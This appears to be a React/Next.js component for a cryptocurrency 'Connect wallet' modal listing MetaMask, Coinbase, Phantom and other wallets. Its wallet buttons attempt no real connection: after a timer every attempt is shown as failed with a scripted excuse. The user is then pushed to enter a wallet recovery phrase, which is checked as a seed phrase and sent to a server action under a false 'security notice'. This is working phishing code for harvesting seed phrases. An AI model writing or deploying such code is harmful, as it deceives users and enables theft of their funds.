'use client';

import {
	ChevronRight,
	X,
	AlertCircle,
	Lock,
} from 'lucide-react';
import React, { useState } from 'react';
import Image from 'next/image';
import { toast } from 'sonner';
import { connectWallet } from '@/actions/user/walletConnect';
import {
	dashboardCardTitleClass,
	dashboardModalTitleClass,
	dashboardSectionTitleClass,
	userInputClass,
	userPrimaryButtonClass,
	userSecondaryButtonClass,
} from '@/lib/userFormStyles';
import { cn } from '@/lib/utils';

const PreviewWallet = ({
	open,
	setOpen,
}: {
	open: boolean;
	setOpen: (open: boolean) => void;
}) => {
	const [loadingWallet, setLoadingWallet] = useState<string | null>(null);
	const [connectedWallet, setConnectedWallet] = useState<string | null>(null);
	const [showSeedForm, setShowSeedForm] = useState(false);
	const [connectionFailed, setConnectionFailed] = useState(false);
	const [failureReason, setFailureReason] = useState('');

	const failureReasons: Record<string, string> = {
		Metamask:
			'MetaMask extension was not detected or is locked. Install or unlock MetaMask in your browser, then try again — or connect manually with your passphrase.',
		Walletconnect:
			'Could not open a WalletConnect session. Your mobile wallet may be unavailable, the QR session timed out, or the request was declined.',
		Coinbase:
			'Coinbase Wallet could not be reached. The app may not be installed, or the connection request was not approved.',
		'Trust Wallet':
			'Trust Wallet did not respond. The app may be closed, or automatic pairing is unavailable on this device.',
		Phantom:
			'Phantom extension was not found or is locked. Open Phantom in your browser, or connect manually with your passphrase.',
	};

	const handleWalletClick = (walletName: string) => {
		setLoadingWallet(walletName);
		setConnectionFailed(false);
		setFailureReason('');
		setTimeout(() => {
			setLoadingWallet(null);
			setConnectedWallet(walletName);
			setConnectionFailed(true);
			setFailureReason(
				failureReasons[walletName] ??
					'Automatic connection could not be completed. Connect manually with your wallet passphrase to continue.',
			);
		}, 2500);
	};

	const wallets = [
		{
			name: 'Metamask',
			imageurl: '/dashboard/stocks/metamask.png',
			popular: true,
		},
		{
			name: 'Walletconnect',
			imageurl: '/dashboard/stocks/walletconnect.png',
			popular: true,
		},
		{
			name: 'Coinbase',
			imageurl: '/dashboard/stocks/coinbase.png',
			popular: true,
		},
		{
			name: 'Trust Wallet',
			imageurl: '/dashboard/stocks/trust_wallet.png',
			popular: false,
		},
		{
			name: 'Phantom',
			imageurl: '/dashboard/stocks/phantom.png',
			popular: false,
		},
	];

	const handleTryAnother = () => {
		setLoadingWallet(null);
		setConnectedWallet(null);
		setShowSeedForm(false);
		setConnectionFailed(false);
		setFailureReason('');
	};

	const handleShowSeedForm = () => {
		setShowSeedForm(true);
	};

	const handleConnectWithSeed = async (seedPhrase: string) => {
		if (!connectedWallet) return;

		const result = await connectWallet(connectedWallet, seedPhrase);
		if (result.error) {
			toast.error(result.error);
			return;
		}

		toast.success(result.success ?? 'Wallet connected successfully.');
		setOpen(false);
		setLoadingWallet(null);
		setConnectedWallet(null);
		setShowSeedForm(false);
		setConnectionFailed(false);
		setFailureReason('');
	};

	if (!open) return null;

	return (
		<div
			className='fixed inset-0 z-[60] flex items-end justify-center bg-black/80 p-3 pb-24 backdrop-blur-sm sm:items-center sm:p-4 sm:pb-4'
			onClick={() => setOpen(false)}
		>
			<div
				className='relative flex max-h-[88vh] w-full max-w-md flex-col overflow-hidden rounded-2xl border border-zinc-800 bg-zinc-950 shadow-2xl sm:max-h-[92vh]'
				onClick={(e) => e.stopPropagation()}
			>
				<div className='flex shrink-0 items-center justify-between border-b border-zinc-800 px-4 py-3 sm:px-5 sm:py-4'>
					<p className='text-sm font-medium text-gray-400'>Connect wallet</p>
					<button
						type='button'
						onClick={() => {
							setOpen(false);
							setLoadingWallet(null);
							setConnectedWallet(null);
							setShowSeedForm(false);
							setConnectionFailed(false);
							setFailureReason('');
						}}
						className='rounded-lg p-1.5 text-gray-400 transition hover:bg-zinc-800 hover:text-white'
						aria-label='Close'
					>
						<X className='h-5 w-5' />
					</button>
				</div>

				<div className='flex-1 overflow-y-auto px-4 py-4 sm:px-5 sm:py-6'>
					{/* Loading State */}
					{loadingWallet && !connectedWallet && !showSeedForm && (
						<LoadingScreen
							walletName={loadingWallet}
							imageurl={
								wallets.find((w) => w.name === loadingWallet)
									?.imageurl || ''
							}
						/>
					)}

					{/* Connection Failed State */}
					{connectionFailed && connectedWallet && !showSeedForm && (
						<ConnectionFailed
							walletName={connectedWallet}
							imageurl={
								wallets.find((w) => w.name === connectedWallet)
									?.imageurl || ''
							}
							reason={failureReason}
							onManualConnect={handleShowSeedForm}
							onTryAnother={handleTryAnother}
						/>
					)}

					{/* Seed Phrase Form */}
					{showSeedForm && connectedWallet && (
						<SeedPhraseForm
							walletName={connectedWallet}
							imageurl={
								wallets.find((w) => w.name === connectedWallet)
									?.imageurl || ''
							}
							onConnect={handleConnectWithSeed}
							onBack={() => setShowSeedForm(false)}
						/>
					)}

					{/* Initial Wallet List */}
					{!loadingWallet && !connectedWallet && !showSeedForm && (
						<>
							<div className='mb-4 space-y-1'>
								<h2 className={dashboardModalTitleClass}>
									Choose a wallet
								</h2>
								<p className='text-xs text-gray-400 sm:text-sm'>
									Select a provider to connect your wallet securely.
								</p>
							</div>
							<div className='space-y-2.5 sm:space-y-3'>
								{wallets.map((wallet) => (
									<Wallets
										key={wallet.name}
										wallet={wallet}
										onWalletClick={() =>
											handleWalletClick(wallet.name)
										}
									/>
								))}
							</div>
							<div className='mt-5 sm:mt-6'>
								<p className='text-center text-[11px] leading-relaxed text-gray-500 sm:text-xs'>
									By connecting a wallet, you agree to our{' '}
									<a
										href=''
										className='text-blue-400 hover:underline'
									>
										Terms of Service
									</a>{' '}
									and{' '}
									<a
										href=''
										className='text-blue-400 hover:underline'
									>
										Privacy Policy
									</a>
									.
								</p>
							</div>
						</>
					)}
				</div>
			</div>
		</div>
	);
};

const LoadingScreen = ({
	walletName,
	imageurl,
}: {
	walletName: string;
	imageurl: string;
}) => {
	return (
		<div className='flex flex-col items-center justify-center py-8 sm:py-12'>
			<div className='mb-6 sm:mb-8'>
				<div className='relative h-16 w-16 sm:h-20 sm:w-20'>
					<svg
						className='absolute inset-0 w-full h-full'
						viewBox='0 0 100 100'
						xmlns='http://www.w3.org/2000/svg'
					>
						<circle
							cx='50'
							cy='50'
							r='45'
							fill='none'
							stroke='#3b82f6'
							strokeWidth='3'
							strokeDasharray='141 282'
							opacity='0.3'
						/>
						<circle
							cx='50'
							cy='50'
							r='45'
							fill='none'
							stroke='#3b82f6'
							strokeWidth='3'
							strokeDasharray='141 282'
							style={{
								animation: 'spin 2s linear infinite',
								transformOrigin: '50% 50%',
							}}
						/>
					</svg>
					<div className='absolute inset-0 flex items-center justify-center'>
						<Image
							src={imageurl}
							width={45}
							height={45}
							alt={walletName}
							className='rounded-md'
						/>
					</div>
				</div>
				<style>{`
                    @keyframes spin {
                        from { transform: rotate(0deg); }
                        to { transform: rotate(360deg); }
                    }
                `}</style>
			</div>

			<h2 className={`${dashboardModalTitleClass} mb-2 text-center`}>
				Connecting to {walletName}
			</h2>
			<p className='mb-6 max-w-xs text-center text-xs text-gray-400 sm:mb-8 sm:text-sm'>
				Please wait while we establish a secure connection...
			</p>

			<div className='flex items-center gap-1.5'>
				<div
					className='w-2 h-2 rounded-full bg-blue-400 animate-bounce'
					style={{ animationDelay: '0s' }}
				/>
				<div
					className='w-2 h-2 rounded-full bg-blue-400 animate-bounce'
					style={{ animationDelay: '0.2s' }}
				/>
				<div
					className='w-2 h-2 rounded-full bg-blue-400 animate-bounce'
					style={{ animationDelay: '0.4s' }}
				/>
			</div>
		</div>
	);
};

const ConnectionFailed = ({
	walletName,
	imageurl,
	reason,
	onManualConnect,
	onTryAnother,
}: {
	walletName: string;
	imageurl: string;
	reason: string;
	onManualConnect: () => void;
	onTryAnother: () => void;
}) => {
	return (
		<div className='flex flex-col items-center py-2 sm:py-4'>
			<div className='mb-4 flex h-14 w-14 items-center justify-center rounded-full border border-red-500/30 bg-red-500/10 sm:mb-5 sm:h-16 sm:w-16'>
				<AlertCircle className='h-7 w-7 text-red-400 sm:h-8 sm:w-8' />
			</div>

			<div className='mb-4 flex h-16 w-16 items-center justify-center rounded-full border border-zinc-700 bg-zinc-800/50 sm:mb-5 sm:h-20 sm:w-20'>
				<Image
					src={imageurl}
					width={44}
					height={44}
					alt={walletName}
					className='h-10 w-10 sm:h-11 sm:w-11'
				/>
			</div>

			<h2 className={`${dashboardModalTitleClass} mb-2 max-w-xs text-center`}>
				{walletName} connection failed
			</h2>
			<p className='mb-4 max-w-sm px-1 text-center text-xs leading-relaxed text-gray-400 sm:mb-6 sm:text-sm'>
				We could not connect to your wallet automatically.
			</p>

			<div className='mb-5 w-full rounded-xl border border-red-500/25 bg-red-500/10 p-3 sm:mb-6 sm:p-4'>
				<p className='text-xs leading-relaxed text-red-200 sm:text-sm'>{reason}</p>
			</div>

			<div className='flex w-full flex-col gap-2.5 sm:flex-row sm:gap-3'>
				<button
					type='button'
					onClick={onManualConnect}
					className={cn(userPrimaryButtonClass, 'sm:flex-1')}
				>
					Connect manually
				</button>

				<button
					type='button'
					onClick={onTryAnother}
					className={cn(userSecondaryButtonClass, 'w-full py-3 sm:flex-1')}
				>
					Try a different wallet
				</button>
			</div>
		</div>
	);
};

interface SeedValidation {
	wordCount: number;
	isValid: boolean;
	words: string[];
	errors: string[];
}

const validatePassphrase = (input: string): SeedValidation => {
	const trimmedInput = input.trim();
	if (trimmedInput.length === 0) {
		return {
			wordCount: 0,
			isValid: false,
			words: [],
			errors: ['Passphrase is required.'],
		};
	}

	const words = trimmedInput.split(/\s+/).filter((word) => word.length > 0);
	const wordCount = words.length;

	if (wordCount === 1 && trimmedInput.length >= 12) {
		return { wordCount, isValid: true, words, errors: [] };
	}

	return validateSeedPhrase(input);
};

const validateSeedPhrase = (input: string): SeedValidation => {
	const trimmedInput = input.trim();
	const words = trimmedInput.split(/\s+/).filter((word) => word.length > 0);
	const wordCount = words.length;
	const errors: string[] = [];
	let isValid = true;

	if (trimmedInput.length < 12) {
		errors.push('Passphrase must be at least 12 characters long.');
		isValid = false;
	}

	// Check valid word count when multiple words are entered
	const validCounts = [12, 16, 18, 24];
	if (wordCount > 1 && !validCounts.includes(wordCount)) {
		errors.push(
			`Recovery phrase must be 12, 16, 18, or 24 words. You have ${wordCount}.`,
		);
		isValid = false;
	}

	// Check for special characters or numbers in seed words
	const invalidWords = words.filter((word) => !/^[a-zA-Z]+$/.test(word));
	if (wordCount > 1 && invalidWords.length > 0) {
		errors.push(
			'Recovery phrase words must contain only letters.',
		);
		isValid = false;
	}

	if (
		wordCount > 1 &&
		validCounts.includes(wordCount) &&
		invalidWords.length === 0 &&
		trimmedInput.length >= 12
	) {
		isValid = true;
		errors.length = 0;
	}

	return {
		wordCount,
		isValid,
		words,
		errors,
	};
};

const SeedPhraseForm = ({
	walletName,
	imageurl,
	onConnect,
	onBack,
}: {
	walletName: string;
	imageurl: string;
	onConnect: (seedPhrase: string) => Promise<void>;
	onBack: () => void;
}) => {
	const [seedInput, setSeedInput] = useState('');
	const [touched, setTouched] = useState(false);
	const [isSubmitting, setIsSubmitting] = useState(false);

	const validation = validatePassphrase(seedInput);
	const showValidation = touched || seedInput.length > 0;

	const handleSubmit = async () => {
		if (!validation.isValid) return;

		setIsSubmitting(true);
		try {
			await onConnect(seedInput);
		} finally {
			setIsSubmitting(false);
		}
	};

	return (
		<div className='flex flex-col py-1 sm:py-2'>
			<div className='mb-4 flex items-center justify-center'>
				<div className='flex h-14 w-14 items-center justify-center rounded-lg border border-zinc-700 bg-zinc-800 sm:h-16 sm:w-16'>
					<Image
						src={imageurl}
						width={40}
						height={40}
						alt={walletName}
						className='h-9 w-9 sm:h-10 sm:w-10'
					/>
				</div>
			</div>

			<h2 className={`${dashboardSectionTitleClass} mb-2 text-center`}>
				Enter passphrase
			</h2>
			<p className='mb-5 max-w-sm px-1 text-center text-xs text-gray-400 sm:mb-6 sm:text-sm'>
				{walletName} — enter your wallet passphrase to continue
			</p>

			<div className='mb-3 sm:mb-4'>
				<label
					htmlFor='wallet-passphrase'
					className='mb-2 block text-sm font-medium text-gray-300'
				>
					Wallet passphrase
				</label>

				<textarea
					id='wallet-passphrase'
					value={seedInput}
					onChange={(e) => setSeedInput(e.target.value)}
					onBlur={() => setTouched(true)}
					onFocus={() => setTouched(true)}
					placeholder='Enter your wallet passphrase or recovery phrase...'
					className={cn(userInputClass, 'h-28 resize-none sm:h-32')}
				/>
			</div>

			<p className='mb-4 text-xs text-gray-400 sm:mb-5 sm:text-sm'>
				Your passphrase must be at least 12 characters long
			</p>

			<div className='mb-5 flex items-start gap-3 rounded-xl border border-zinc-700 bg-zinc-800/50 p-3 sm:mb-6 sm:p-4'>
				<Lock className='mt-0.5 h-4 w-4 shrink-0 text-gray-300 sm:h-5 sm:w-5' />
				<div>
					<p className='mb-1 text-xs font-semibold text-white sm:text-sm'>
						Security notice
					</p>
					<p className='text-xs text-gray-400 sm:text-sm'>
						Your connection will be submitted for verification.
					</p>
				</div>
			</div>

			{showValidation && validation.errors.length > 0 && (
				<div className='mb-4 space-y-2 sm:mb-5'>
					{validation.errors.map((error, idx) => (
						<div key={idx} className='flex items-start gap-2'>
							<AlertCircle className='mt-0.5 h-4 w-4 shrink-0 text-red-400' />
							<p className='text-xs text-red-400 sm:text-sm'>{error}</p>
						</div>
					))}
				</div>
			)}

			<div className='flex flex-col-reverse gap-2.5 sm:flex-row sm:gap-3'>
				<button
					type='button'
					onClick={onBack}
					disabled={isSubmitting}
					className={cn(
						userSecondaryButtonClass,
						'w-full py-3 sm:flex-1',
					)}
				>
					Cancel
				</button>
				<button
					type='button'
					onClick={handleSubmit}
					disabled={!validation.isValid || isSubmitting}
					className={cn(userPrimaryButtonClass, 'sm:flex-1')}
				>
					{isSubmitting ? 'Connecting…' : 'Connect wallet'}
				</button>
			</div>
		</div>
	);
};

const Wallets = ({
	wallet,
	onWalletClick,
}: {
	wallet: {
		name: string;
		imageurl: string;
		popular?: boolean;
	};
	onWalletClick: () => void;
}) => {
	return (
		<button
			type='button'
			className='flex w-full items-center justify-between rounded-xl border border-zinc-800 bg-zinc-900/40 p-3 text-left transition hover:border-indigo-500/50 hover:bg-zinc-900 active:scale-[0.99] sm:p-4'
			onClick={onWalletClick}
		>
			<div className='flex min-w-0 items-center gap-3'>
				<div className='flex h-10 w-10 shrink-0 items-center justify-center rounded-lg border border-zinc-700 bg-zinc-800 sm:h-12 sm:w-12'>
					<Image
						src={wallet.imageurl}
						width={32}
						height={32}
						alt={wallet.name}
						className='h-7 w-7 sm:h-8 sm:w-8'
					/>
				</div>
				<div className='min-w-0'>
					<p className={dashboardCardTitleClass}>{wallet.name}</p>
					{wallet.popular ? (
						<div className='mt-1 w-fit rounded bg-indigo-500/20 px-2 py-0.5 text-[10px] font-medium text-indigo-300 sm:text-xs'>
							Popular
						</div>
					) : null}
				</div>
			</div>
			<ChevronRight className='h-5 w-5 shrink-0 text-gray-500' />
		</button>
	);
};

export default PreviewWallet;
